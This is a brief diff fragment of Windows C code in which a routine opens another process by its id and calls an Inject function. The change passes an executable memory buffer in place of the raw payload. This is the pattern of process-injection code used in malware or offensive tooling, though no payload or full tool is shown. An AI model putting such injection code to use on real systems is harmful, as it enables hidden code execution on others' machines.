@@ -103,7 +103,7 @@ int main(void) {
                         FALSE, (DWORD) pid);
         
         if (hProc != NULL) {
-            Inject(hProc, payload, payload_len);
+            Inject(hProc, exec_mem, payload_len);
             CloseHandle(hProc);
         }
     }
